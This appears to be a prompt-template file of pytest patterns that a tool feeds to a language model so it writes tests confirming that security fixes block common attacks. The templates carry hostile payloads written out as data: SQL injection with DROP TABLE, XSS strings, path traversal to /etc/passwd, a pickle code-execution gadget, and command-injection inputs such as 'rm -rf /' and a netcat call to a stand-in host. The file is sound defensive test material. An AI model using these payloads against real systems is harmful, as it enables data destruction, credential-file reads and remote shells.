# Test templates

`generate_tests.py` appends the matching section to the LLM prompt. Tests should be
runnable as-is by the language's standard test runner (pytest, jest, go test, etc.).

## SQL_INJECTION

Pattern (pytest):

```python
import pytest
from app.db import lookup_user  # adjust import

@pytest.mark.parametrize("payload", [
    "1 OR 1=1",
    "1; DROP TABLE users;--",
    "' OR ''='",
    "\"' OR 1=1 --",
])
def test_sql_injection_blocked(payload):
    # The fixed code must either raise / return safely, never execute the payload.
    result = lookup_user(payload)
    # If lookup_user returns rows, ensure it doesn't return EVERY row.
    assert result in (None, []) or len(result) <= 1
```

Equivalent shape in jest / go test / rspec / JUnit is fine; same idea: feed classic
SQLi payloads through the patched function and assert the result is bounded.

## XSS

Pattern (pytest with a render function):

```python
import pytest
from app.render import render_comment

@pytest.mark.parametrize("payload", [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
])
def test_xss_escaped(payload):
    out = render_comment(payload)
    assert "<script" not in out.lower()
    assert "onerror=" not in out.lower()
    assert "javascript:" not in out.lower()
```

For DOM-rendered (browser) code, use jsdom-based testing or Playwright snapshot.

## HARDCODED_SECRET

```python
import os, importlib

def test_secret_not_hardcoded(monkeypatch):
    monkeypatch.setenv("API_KEY", "test-value")
    mod = importlib.reload(importlib.import_module("app.config"))
    assert mod.API_KEY == "test-value"

def test_secret_missing_env_raises_or_defaults(monkeypatch):
    monkeypatch.delenv("API_KEY", raising=False)
    # Either it raises a clear error, or falls back to a non-secret default —
    # but it must NOT equal the original committed string.
    try:
        mod = importlib.reload(importlib.import_module("app.config"))
        assert mod.API_KEY != "<the-old-hardcoded-value>"
    except (KeyError, RuntimeError):
        pass  # acceptable failure mode
```

## COMMAND_INJECTION

```python
import pytest
from app.shell import run_user_cmd

@pytest.mark.parametrize("payload", [
    "; rm -rf /",
    "&& cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "| nc evil 4444",
])
def test_command_injection_blocked(payload):
    # The patched function must not execute the injected portion.
    # Either rejects the input or treats the whole thing as a literal argument.
    result = run_user_cmd(payload)
    assert "root:" not in str(result)
    assert "uid=" not in str(result)
```

## PATH_TRAVERSAL

```python
import pytest
from app.files import read_user_file

@pytest.mark.parametrize("payload", [
    "../../etc/passwd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "/etc/passwd",
    "uploads/../../etc/passwd",
])
def test_path_traversal_blocked(payload):
    with pytest.raises((ValueError, PermissionError, FileNotFoundError)):
        read_user_file(payload)
```

## INSECURE_DESERIALIZATION

```python
import pytest, pickle, base64
from app.serializer import load

def test_pickle_payload_rejected():
    class Pwn:
        def __reduce__(self):
            return (eval, ("__import__('os').system('echo PWNED > /tmp/p')",))
    bad = base64.b64encode(pickle.dumps(Pwn())).decode()
    with pytest.raises(Exception):
        load(bad)
```

## WEAK_CRYPTO

```python
from app.hashing import hash_password

def test_password_hash_not_weak():
    h = hash_password("hunter2")
    # Reject SHA-1 / MD5 / raw SHA-256 hex (length-based, fast)
    assert not (len(h) == 32 and all(c in "0123456789abcdef" for c in h))  # md5 hex
    assert not (len(h) == 40 and all(c in "0123456789abcdef" for c in h))  # sha1 hex
    # Expect bcrypt / argon2 / scrypt / pbkdf2 — all have distinct prefixes
    assert h.startswith(("$2a$", "$2b$", "$argon2", "$scrypt$", "$pbkdf2"))
```

## VULNERABLE_DEPENDENCY

```python
import re
from pathlib import Path

def test_no_vulnerable_version_pinned():
    text = Path("requirements.txt").read_text()
    # Replace <pkg> and <bad_version> at generation time.
    bad = re.search(r"^(<pkg>)==(<bad_version>)$", text, flags=re.MULTILINE)
    assert bad is None, "Vulnerable version is still pinned"
```

For Node ecosystems, parse `package.json` and assert no `^X.Y.Z` resolving to vulnerable.
For Go/Rust/Ruby use the language's idiomatic file parsing.

## SSRF / OPEN_REDIRECT / OTHER

Write a test that constructs the malicious input most directly described in the
finding's `description`, calls the patched function, and asserts the dangerous
behavior is blocked. If you can't write a meaningful test without more code context,
emit `// CANNOT_TEST: <reason>`.
